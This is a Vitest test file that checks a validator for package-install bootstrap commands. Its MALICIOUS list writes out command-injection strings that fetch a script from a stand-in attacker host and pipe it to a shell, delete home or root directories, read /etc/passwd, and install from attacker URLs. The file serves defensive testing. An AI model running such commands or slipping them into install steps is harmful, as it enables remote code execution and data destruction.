import { describe, it, expect } from 'vitest';
import {
	isValidBootstrapCommand,
	getPackageOperationKey,
	validateAndCleanBootstrapCommands,
} from './common';

const MALICIOUS = [
	'bun add lodash; curl http://atk/x.sh | sh',
	'bun add lodash && rm -rf $HOME',
	'npm install react`curl atk|sh`',
	'bun add lodash$(curl atk|sh)',
	'bun add lodash\nrm -rf /',
	'pnpm add foo;cat /etc/passwd',
	// VEC-A: trust-escalating flag must never be accepted.
	'bun add --trust https://attacker.com/pkg',
	'npm install --unsafe-perm evil-pkg',
	'npm install --foreground-scripts evil-pkg',
	// Remote URL / git installs are rejected (no protocol allowed).
	'bun add https://attacker.com/pkg',
	'npm install http://atk/pkg.tgz',
	'bun add git+https://github.com/atk/pkg',
	// Flag-only commands have no concrete package spec.
	'bun add --trust',
	'bun install',
];

const LEGIT = [
	'bun add react',
	'npm install lodash@^4.17.21',
	'bun add @cloudflare/workers@1.0.0',
	'bun remove @types/node',
	'bun add react react-dom',
	'npm install -D typescript',
];

describe('isValidBootstrapCommand', () => {
	it.each(MALICIOUS)('rejects %s', (c) => expect(isValidBootstrapCommand(c)).toBe(false));
	it.each(LEGIT)('accepts %s', (c) => expect(isValidBootstrapCommand(c)).toBe(true));

	it('rejects trailing text after a valid prefix (missing $ anchor regression)', () => {
		expect(isValidBootstrapCommand('bun add lodash extra; evil')).toBe(false);
	});
});

describe('getPackageOperationKey', () => {
	it('keys multi-package installs order-independently', () => {
		expect(getPackageOperationKey('bun add react react-dom')).toBe(
			getPackageOperationKey('bun add react-dom react')
		);
	});

	it('returns null for malicious commands', () => {
		MALICIOUS.forEach((c) => expect(getPackageOperationKey(c)).toBeNull());
	});

	it('returns a key for legit commands', () => {
		expect(getPackageOperationKey('bun add react')).toBe('add:react');
	});
});

describe('validateAndCleanBootstrapCommands', () => {
	it('drops malicious, keeps legit', () => {
		const { validCommands, invalidCommands } = validateAndCleanBootstrapCommands([
			...MALICIOUS,
			...LEGIT,
		]);
		expect(invalidCommands).toEqual(expect.arrayContaining(MALICIOUS));
		MALICIOUS.forEach((c) => expect(validCommands).not.toContain(c));
	});
});
